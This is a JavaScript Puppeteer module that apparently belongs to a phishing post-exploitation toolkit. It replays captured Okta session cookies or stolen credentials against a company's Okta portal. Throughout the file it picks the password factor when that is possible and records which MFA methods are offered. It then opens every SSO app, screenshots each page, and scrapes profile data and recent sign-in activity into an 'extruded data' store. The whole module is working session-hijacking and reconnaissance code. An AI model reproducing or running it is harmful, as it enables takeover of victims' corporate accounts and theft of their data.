const necrohelp = require('../../tasks/helpers/necrohelp')
const db = require('../../db/db')
const clusterLib = require('../../puppeteer/cluster')

/**
 * LoginAndEnumerate - Login to Okta portal, check for MFA, enumerate apps, and screenshot various pages
 *
 * Expected params (credentials-based):
 * {
 *   "email": "user@example.com",
 *   "password": "password123",
 *   "oktaPortal": "mycompany.okta.com"  // without https://
 * }
 *
 * Expected params (cookie-based, like office365 tasks):
 * {
 *   "oktaPortal": "mycompany.okta.com"  // without https://
 * }
 * (and pass cookies array in the task)
 *
 * Login flow:
 * 1. Enter username/email in input[name="identifier"]
 * 2. Click Next button
 * 3. View "Verify it's you" page with authentication methods (Okta Verify, Password, etc.)
 * 4. Select Password authentication
 * 5. Enter password in input[name="credentials.passcode"]
 * 6. Click Verify button
 * 7. Check for additional MFA if required
 * 8. Enumerate apps and take screenshots
 */
exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) => {
    await db.UpdateTaskStatus(taskId, "running")

    const email = params.email
    const password = params.password
    const oktaPortal = params.oktaPortal
    const oktaUrl = `https://${oktaPortal}`

    console.log(`[${taskId}] Starting Okta login automation for portal: ${oktaPortal}`)

    // Set cookies BEFORE navigating (like office365 tasks)
    if (cookies && cookies.length > 0) {
        console.log(`[${taskId}] Setting ${cookies.length} Okta cookies before navigation`)
        await page.setCookie(...cookies);
    }

    // Increase zoom for debugging purposes when running in gui mode
    await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)

    try {
        // Navigate to Okta portal
        console.log(`[${taskId}] Navigating to Okta portal: ${oktaUrl}`)
        await page.goto(oktaUrl, { waitUntil: 'networkidle0', timeout: 30000 })
        await necrohelp.Sleep(5000)

        // Take screenshot of initial landing page
        await necrohelp.ScreenshotCurrentPage(page, taskId)
        await db.AddExtrudedData(taskId, 'step', Buffer.from('01_initial_page').toString('base64'))

        // Check if already logged in (cookies were valid or SSO worked)
        // Multiple selectors for different Okta UI versions
        const loggedInSelectors = [
            'a[aria-label="Settings"]',
            '.okta-dashboard',
            'button[aria-label="Account menu"]',
            '[data-se="user-menu"]',
            '#account-button'
        ]

        let isLoggedIn = false
        for (const selector of loggedInSelectors) {
            const element = await page.$(selector).catch(() => null)
            if (element) {
                isLoggedIn = true
                console.log(`[${taskId}] Session is valid. Logged in detected with selector: ${selector}`)
                await db.AddExtrudedData(taskId, 'auth_method', Buffer.from('cookies').toString('base64'))
                break
            }
        }

        // Track if MFA was required during authentication
        let mfaRequired = false

        if (!isLoggedIn) {
            // Not logged in via cookies, need credentials
            if (!email || !password) {
                const errorMsg = "Not logged in and no credentials provided. Either provide valid cookies or email/password."
                console.log(`[${taskId}] ${errorMsg}`)
                await db.UpdateTaskStatusWithReason(taskId, "error", errorMsg)
                return
            }

            console.log(`[${taskId}] Not logged in via cookies, proceeding with credential authentication`)
            await db.AddExtrudedData(taskId, 'auth_method', Buffer.from('credentials').toString('base64'))

            // Step 1: Enter username/email in identifier field
            console.log(`[${taskId}] Entering username: ${email}`)
            await page.waitForSelector('input[name="identifier"]', { timeout: 10000 })
            await page.type('input[name="identifier"]', email, { delay: 100 })
            await necrohelp.Sleep(1000)

            // Take screenshot with username entered
            await necrohelp.ScreenshotCurrentPage(page, taskId)
            await db.AddExtrudedData(taskId, 'step', Buffer.from('02_username_entered').toString('base64'))

            // Step 2: Click Next button
            console.log(`[${taskId}] Clicking Next button`)
            await page.click('input.button.button-primary[type="submit"][value="Next"]').catch(console.error)
            await necrohelp.Sleep(3000)

            // Take screenshot after clicking Next
            await necrohelp.ScreenshotCurrentPage(page, taskId)
            await db.AddExtrudedData(taskId, 'step', Buffer.from('03_after_next').toString('base64'))

            // Step 3: Detect which flow we're in
            // Okta can show either:
            // A) Authentication method selection page (.authenticator-row elements)
            // B) Direct password field (input[name="credentials.passcode"])

            console.log(`[${taskId}] Detecting authentication flow...`)
            const directPasswordField = await page.$('input[name="credentials.passcode"]').catch(() => null)

            if (directPasswordField) {
                // FLOW B: Direct password field (simpler flow)
                console.log(`[${taskId}] Detected DIRECT PASSWORD FLOW - password field already visible`)
                await db.AddExtrudedData(taskId, 'auth_flow', Buffer.from('direct_password').toString('base64'))

                // Enter password directly
                console.log(`[${taskId}] Entering password in direct field`)
                await page.type('input[name="credentials.passcode"]', password, { delay: 100 })
                await necrohelp.Sleep(1000)

                // Click Verify button
                console.log(`[${taskId}] Clicking Verify button`)
                await page.click('input.button.button-primary[type="submit"][value="Verify"]').catch(console.error)

            } else {
                // FLOW A: Authentication method selection page
                console.log(`[${taskId}] Detected AUTH SELECTION FLOW - checking available methods`)
                await db.AddExtrudedData(taskId, 'auth_flow', Buffer.from('method_selection').toString('base64'))

                const authMethods = await page.$$('.authenticator-row').catch(() => [])
                console.log(`[${taskId}] Found ${authMethods.length} authentication methods`)

                // Capture available auth methods
                const methodsList = []
                for (let method of authMethods) {
                    const label = await method.$eval('.authenticator-label', el => el.textContent).catch(() => 'Unknown')
                    const desc = await method.$eval('.authenticator-description--text', el => el.textContent).catch(() => '')
                    methodsList.push({ label: label.trim(), description: desc.trim() })
                    console.log(`[${taskId}]   Auth method: ${label.trim()} - ${desc.trim()}`)
                }
                await db.AddExtrudedData(taskId, 'auth_methods', Buffer.from(JSON.stringify(methodsList)).toString('base64'))

                // Save authentication methods list to filesystem BEFORE clicking on Password
                const authMethodsPath = await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'auth_methods_list')
                if (authMethodsPath) {
                    console.log(`[${taskId}] Authentication methods list screenshot saved to filesystem: ${authMethodsPath}`)
                }

                // Try to select Password authentication
                console.log(`[${taskId}] Looking for Password authentication option`)
                const passwordButton = await page.$('div[data-se="okta_password"] a.select-factor').catch(() => null)

                if (!passwordButton) {
                    // Password not available, check for MFA requirement
                    console.log(`[${taskId}] Password option not found, checking for other MFA requirements`)
                    await checkForMFA(page, taskId)
                    // If MFA is required and we can't proceed, stop here
                    const errorMsg = "Password authentication not available. MFA may be required."
                    console.log(`[${taskId}] ${errorMsg}`)
                    await db.UpdateTaskStatusWithReason(taskId, "error", errorMsg)
                    return
                }

                // Click Password select button
                console.log(`[${taskId}] Selecting Password authentication`)
                await passwordButton.click()
                await necrohelp.Sleep(3000)

                // Enter password
                console.log(`[${taskId}] Entering password`)
                await page.waitForSelector('input[name="credentials.passcode"]', { timeout: 10000 })
                await page.type('input[name="credentials.passcode"]', password, { delay: 100 })
                await necrohelp.Sleep(1000)

                // Click Verify button
                console.log(`[${taskId}] Clicking Verify button`)
                await page.click('input.button.button-primary[type="submit"][value="Verify"]').catch(console.error)
            }

            // Wait for page transition after clicking Verify (common for both flows)
            // This is critical because Okta can redirect to either:
            // 1. Dashboard (if no MFA)
            // 2. MFA prompt page (if MFA required)
            // We need to wait for the page to fully load before taking screenshot
            console.log(`[${taskId}] Waiting for page to load after verification...`)
            await necrohelp.Sleep(6000)

            // Wait for either dashboard or MFA prompt to appear to ensure page is stable
            const pageStabilized = await Promise.race([
                page.waitForSelector('.okta-dashboard', { timeout: 5000 }).then(() => 'dashboard').catch(() => null),
                page.waitForSelector('.authenticator-verify-list', { timeout: 5000 }).then(() => 'mfa').catch(() => null),
                page.waitForSelector('[data-se="o-form-fieldset-authenticator"]', { timeout: 5000 }).then(() => 'mfa').catch(() => null),
                necrohelp.Sleep(5000).then(() => 'timeout')
            ])

            console.log(`[${taskId}] Page state after verification: ${pageStabilized}`)

            // Additional wait to ensure page rendering is fully complete
            await necrohelp.Sleep(2000)

            // Take screenshot after verification (both Redis and filesystem)
            await necrohelp.ScreenshotCurrentPage(page, taskId)
            await db.AddExtrudedData(taskId, 'step', Buffer.from('06_after_verify').toString('base64'))

            // Save to filesystem for forensic analysis
            const afterVerifyPath = await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'after_password_verify')
            if (afterVerifyPath) {
                console.log(`[${taskId}] Post-verification screenshot saved to filesystem: ${afterVerifyPath}`)
            }

            // Check for additional MFA prompt after password verification
            const mfaRequired = await checkForMFA(page, taskId)
        }

        // Wait for dashboard to load
        console.log(`[${taskId}] Waiting for dashboard to load`)
        await necrohelp.Sleep(5000)

        // Check if we successfully logged in
        const dashboardElement = await page.$('.okta-dashboard').catch(() => null)
        const appContainerElement = await page.$('#okta-sign-in').catch(() => null)

        if (!dashboardElement && appContainerElement) {
            // Still on login page, authentication failed
            const errorMsg = await page.$eval('.okta-form-infobox-error', el => el.textContent).catch(() => 'Unknown error')
            console.log(`[${taskId}] Login failed: ${errorMsg}`)
            await db.UpdateTaskStatusWithReason(taskId, "error", `Login failed: ${errorMsg}`)
            return
        }

        console.log(`[${taskId}] Successfully logged in to Okta`)

        // Take screenshot of dashboard
        await necrohelp.ScreenshotCurrentPage(page, taskId)
        await db.AddExtrudedData(taskId, 'step', Buffer.from('07_dashboard').toString('base64'))

        // Save successful login dashboard to filesystem ONLY if no MFA was required
        if (!mfaRequired) {
            const dashboardPath = await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'successful_login_no_mfa')
            if (dashboardPath) {
                console.log(`[${taskId}] Successful login (no MFA) dashboard screenshot saved to filesystem: ${dashboardPath}`)
            }
        } else {
            console.log(`[${taskId}] MFA was required, skipping no-MFA dashboard screenshot to filesystem`)
        }

        // Enumerate all available applications
        console.log(`[${taskId}] Enumerating available applications`)
        const apps = await enumerateApps(page, taskId)

        console.log(`[${taskId}] Found ${apps.length} applications`)
        await db.AddExtrudedData(taskId, 'apps_count', Buffer.from(apps.length.toString()).toString('base64'))

        // Store app list
        const appsJson = JSON.stringify(apps, null, 2)
        await db.AddExtrudedData(taskId, 'apps_list', Buffer.from(appsJson).toString('base64'))

        // Open and screenshot each application
        for (let i = 0; i < apps.length; i++) {
            const app = apps[i]
            console.log(`[${taskId}] Opening app ${i + 1}/${apps.length}: ${app.name}`)

            try {
                await openAndScreenshotApp(page, taskId, app, i)
            } catch (error) {
                console.log(`[${taskId}] Error opening app "${app.name}": ${error.message}`)
            }

            // Navigate back to dashboard
            await page.goto(oktaUrl, { waitUntil: 'networkidle0', timeout: 30000 })
            await necrohelp.Sleep(3000)
        }

        // Screenshot user profile settings
        console.log(`[${taskId}] Navigating to profile settings`)
        await screenshotProfileSettings(page, taskId, oktaUrl)

        // Screenshot last activity page
        console.log(`[${taskId}] Navigating to last activity page`)
        await screenshotLastActivity(page, taskId, oktaUrl)

        console.log(`[${taskId}] Okta enumeration completed successfully`)
        await db.UpdateTaskStatus(taskId, "completed")

    } catch (error) {
        console.log(`[${taskId}] Error during Okta automation: ${error.message}`)
        await necrohelp.ScreenshotCurrentPage(page, taskId).catch(console.error)
        await db.UpdateTaskStatusWithReason(taskId, "error", error.message)
    }
}

/**
 * Check for MFA prompt and document it
 * @returns {Promise<boolean>} - Returns true if MFA was detected, false otherwise
 */
async function checkForMFA(page, taskId) {
    console.log(`[${taskId}] Checking for MFA prompt`)

    // No additional wait needed here since we already waited in the main flow
    // Just check immediately for MFA indicators

    // Check for various MFA indicators
    const mfaSelectors = [
        'input[name="answer"]',  // Security question
        'input[name="phoneNumber"]',  // SMS
        'button[value="sms"]',  // SMS button
        'button[value="call"]',  // Voice call button
        '.authenticator-verify-list',  // Authenticator app list
        'input[name="credentials.passcode"]',  // TOTP code input
        '.auth-org-logo',  // Generic Okta verify page
        'input[name="token"]',  // Generic token input
        '[data-se="o-form-fieldset-authenticator"]',  // New Okta identity engine MFA
    ]

    let mfaDetected = false
    let mfaType = 'none'

    for (const selector of mfaSelectors) {
        const element = await page.$(selector).catch(() => null)
        if (element) {
            mfaDetected = true
            mfaType = selector
            break
        }
    }

    if (mfaDetected) {
        console.log(`[${taskId}] MFA DETECTED - Type indicator: ${mfaType}`)
        await db.AddExtrudedData(taskId, 'mfa_on_login', Buffer.from('true').toString('base64'))
        await db.AddExtrudedData(taskId, 'mfa_type', Buffer.from(mfaType).toString('base64'))

        // Take screenshot of MFA page (both Redis and filesystem)
        await necrohelp.ScreenshotCurrentPage(page, taskId)
        await db.AddExtrudedData(taskId, 'step', Buffer.from('03b_mfa_prompt').toString('base64'))

        // Save MFA prompt to filesystem for forensic analysis
        const mfaSanitized = mfaType.replace(/[^a-z0-9_-]/gi, '_')
        const mfaScreenshotPath = await necrohelp.ScreenshotCurrentPageToFS(page, taskId, `mfa_required_${mfaSanitized}`)
        if (mfaScreenshotPath) {
            console.log(`[${taskId}] MFA prompt screenshot saved to filesystem: ${mfaScreenshotPath}`)
        }

        // Check if there are multiple MFA options available
        const mfaOptions = await page.$$('.authenticator-button').catch(() => [])
        console.log(`[${taskId}] MFA options available: ${mfaOptions.length}`)

        if (mfaOptions.length > 0) {
            const optionsList = []
            for (let i = 0; i < mfaOptions.length; i++) {
                const optionText = await mfaOptions[i].evaluate(el => el.textContent).catch(() => 'Unknown')
                optionsList.push(optionText.trim())
            }
            console.log(`[${taskId}] MFA options: ${optionsList.join(', ')}`)
            await db.AddExtrudedData(taskId, 'mfa_options', Buffer.from(JSON.stringify(optionsList)).toString('base64'))
        }

        console.log(`[${taskId}] MFA is required but cannot be bypassed automatically. Manual intervention needed.`)
        return true  // MFA was detected
    } else {
        console.log(`[${taskId}] No MFA detected`)
        await db.AddExtrudedData(taskId, 'mfa_on_login', Buffer.from('false').toString('base64'))
        return false  // No MFA detected
    }
}

/**
 * Enumerate all available applications from the dashboard
 */
async function enumerateApps(page, taskId) {
    const apps = []

    try {
        // Try different selectors for app tiles (Okta classic vs new UI)
        const appSelectors = [
            '.okta-app-card',  // Classic Okta dashboard
            '.app-button',  // Classic Okta dashboard alternative
            '[data-se="app-card"]',  // New Okta identity engine
            '.app-instance',  // Another variant
        ]

        let appElements = []
        for (const selector of appSelectors) {
            appElements = await page.$$(selector).catch(() => [])
            if (appElements.length > 0) {
                console.log(`[${taskId}] Found ${appElements.length} apps using selector: ${selector}`)
                break
            }
        }

        if (appElements.length === 0) {
            console.log(`[${taskId}] No apps found with standard selectors, trying alternative method`)
            // Try to find apps by link attributes
            appElements = await page.$$('a[aria-label][data-se-button]').catch(() => [])
        }

        for (let i = 0; i < appElements.length; i++) {
            const app = appElements[i]

            // Extract app information
            const appName = await app.evaluate(el => {
                return el.getAttribute('aria-label') ||
                       el.querySelector('.app-button-name')?.textContent ||
                       el.querySelector('.app-label')?.textContent ||
                       el.textContent.trim()
            }).catch(() => `App ${i + 1}`)

            const appLink = await app.evaluate(el => {
                return el.href || el.querySelector('a')?.href || ''
            }).catch(() => '')

            const appLogo = await app.evaluate(el => {
                const img = el.querySelector('img')
                return img ? img.src : ''
            }).catch(() => '')

            apps.push({
                name: appName.trim(),
                link: appLink,
                logo: appLogo,
                index: i
            })

            console.log(`[${taskId}]   App ${i + 1}: ${appName.trim()}`)
        }

    } catch (error) {
        console.log(`[${taskId}] Error enumerating apps: ${error.message}`)
    }

    return apps
}

/**
 * Open an application and take screenshots, check for SSO MFA
 */
async function openAndScreenshotApp(page, taskId, app, index) {
    console.log(`[${taskId}] Opening app: ${app.name}`)

    try {
        // Click on the app to launch it
        const appSelectors = [
            `.okta-app-card:nth-child(${index + 1})`,
            `.app-button:nth-child(${index + 1})`,
            `[data-se="app-card"]:nth-child(${index + 1})`,
            `a[aria-label="${app.name}"]`,
        ]

        let clicked = false
        for (const selector of appSelectors) {
            const element = await page.$(selector).catch(() => null)
            if (element) {
                await element.click().catch(console.error)
                clicked = true
                break
            }
        }

        if (!clicked && app.link) {
            console.log(`[${taskId}] Could not click app element, navigating directly to: ${app.link}`)
            await page.goto(app.link, { waitUntil: 'networkidle0', timeout: 30000 })
        }

        // Wait for navigation or new tab
        await necrohelp.Sleep(5000)

        // Check if we're on a different page (SSO redirect)
        const currentUrl = await page.url()
        console.log(`[${taskId}] Current URL after app launch: ${currentUrl}`)

        // Take screenshot of the app
        await necrohelp.ScreenshotCurrentPage(page, taskId)
        await db.AddExtrudedData(taskId, `app_${index}_name`, Buffer.from(app.name).toString('base64'))
        await db.AddExtrudedData(taskId, `app_${index}_url`, Buffer.from(currentUrl).toString('base64'))

        // Check for MFA on SSO app
        const ssoMfaDetected = await checkForSSOMFA(page, taskId, app.name, index)

        if (ssoMfaDetected) {
            console.log(`[${taskId}] MFA detected on SSO app: ${app.name}`)
            await db.AddExtrudedData(taskId, `app_${index}_mfa`, Buffer.from('true').toString('base64'))
        } else {
            console.log(`[${taskId}] No MFA on SSO app: ${app.name}`)
            await db.AddExtrudedData(taskId, `app_${index}_mfa`, Buffer.from('false').toString('base64'))
        }

        // Wait a bit before going back
        await necrohelp.Sleep(2000)

    } catch (error) {
        console.log(`[${taskId}] Error in openAndScreenshotApp: ${error.message}`)
        throw error
    }
}

/**
 * Check if SSO app requires additional MFA
 */
async function checkForSSOMFA(page, taskId, appName, index) {
    // Check for MFA prompts that might appear during SSO
    const ssoMfaSelectors = [
        'input[type="password"]',  // Additional password prompt
        'input[name="otp"]',  // OTP input
        'input[name="code"]',  // Code input
        'button:contains("Verify")',  // Verify button
        '[id*="mfa"]',  // Any element with mfa in id
        '[class*="mfa"]',  // Any element with mfa in class
        '[aria-label*="authenticat"]',  // Authentication related
        '.duo-frame',  // Duo Security
        '#duo_iframe',  // Duo iframe
    ]

    for (const selector of ssoMfaSelectors) {
        const element = await page.$(selector).catch(() => null)
        if (element) {
            console.log(`[${taskId}] SSO MFA detected for "${appName}" with selector: ${selector}`)
            // Take screenshot of SSO MFA page (both Redis and filesystem)
            await necrohelp.ScreenshotCurrentPage(page, taskId)
            await db.AddExtrudedData(taskId, `app_${index}_mfa_screenshot`, Buffer.from('captured').toString('base64'))

            // Save SSO MFA to filesystem for forensic analysis
            const appNameSanitized = appName.replace(/[^a-z0-9_-]/gi, '_').toLowerCase()
            const ssoMfaPath = await necrohelp.ScreenshotCurrentPageToFS(page, taskId, `sso_mfa_app_${index}_${appNameSanitized}`)
            if (ssoMfaPath) {
                console.log(`[${taskId}] SSO MFA screenshot for "${appName}" saved to filesystem: ${ssoMfaPath}`)
            }

            return true
        }
    }

    return false
}

/**
 * Screenshot user profile settings page
 */
async function screenshotProfileSettings(page, taskId, oktaUrl) {
    try {
        // Navigate to settings
        await page.goto(`${oktaUrl}/enduser/settings`, { waitUntil: 'networkidle0', timeout: 30000 })
        await necrohelp.Sleep(3000)

        // Take screenshot
        await necrohelp.ScreenshotCurrentPage(page, taskId)
        await db.AddExtrudedData(taskId, 'step', Buffer.from('08_profile_settings').toString('base64'))

        console.log(`[${taskId}] Profile settings screenshot captured`)

        // Try to capture profile information
        const profileInfo = {}

        // Try to get email
        const emailElement = await page.$('[data-se="profile-email"]').catch(() => null)
        if (emailElement) {
            profileInfo.email = await emailElement.evaluate(el => el.textContent).catch(() => '')
        }

        // Try to get display name
        const nameElement = await page.$('[data-se="profile-name"]').catch(() => null)
        if (nameElement) {
            profileInfo.name = await nameElement.evaluate(el => el.textContent).catch(() => '')
        }

        if (Object.keys(profileInfo).length > 0) {
            await db.AddExtrudedData(taskId, 'profile_info', Buffer.from(JSON.stringify(profileInfo)).toString('base64'))
        }

    } catch (error) {
        console.log(`[${taskId}] Error capturing profile settings: ${error.message}`)
    }
}

/**
 * Screenshot last activity/recent activity page
 */
async function screenshotLastActivity(page, taskId, oktaUrl) {
    try {
        // Try different potential URLs for activity logs
        const activityUrls = [
            `${oktaUrl}/enduser/settings#security`,
            `${oktaUrl}/app/UserHome#security`,
        ]

        let activityFound = false

        for (const url of activityUrls) {
            await page.goto(url, { waitUntil: 'networkidle0', timeout: 30000 }).catch(console.error)
            await necrohelp.Sleep(3000)

            // Check if we can find activity-related elements
            const activityElement = await page.$('[data-se="sign-in-activity"]').catch(() => null) ||
                                   await page.$('.activity-list').catch(() => null) ||
                                   await page.$('.sign-in-list').catch(() => null)

            if (activityElement) {
                activityFound = true
                console.log(`[${taskId}] Found activity page at: ${url}`)
                break
            }
        }

        // Take screenshot regardless
        await necrohelp.ScreenshotCurrentPage(page, taskId)
        await db.AddExtrudedData(taskId, 'step', Buffer.from('09_last_activity').toString('base64'))

        console.log(`[${taskId}] Last activity screenshot captured`)

        // Try to scrape recent activity if available
        const activityItems = await page.$$('[data-se="activity-item"]').catch(() => [])
        if (activityItems.length > 0) {
            const activities = []
            for (let item of activityItems.slice(0, 10)) {  // Get last 10 activities
                const text = await item.evaluate(el => el.textContent).catch(() => '')
                activities.push(text.trim())
            }
            console.log(`[${taskId}] Captured ${activities.length} recent activities`)
            await db.AddExtrudedData(taskId, 'recent_activities', Buffer.from(JSON.stringify(activities)).toString('base64'))
        }

    } catch (error) {
        console.log(`[${taskId}] Error capturing last activity: ${error.message}`)
    }
}
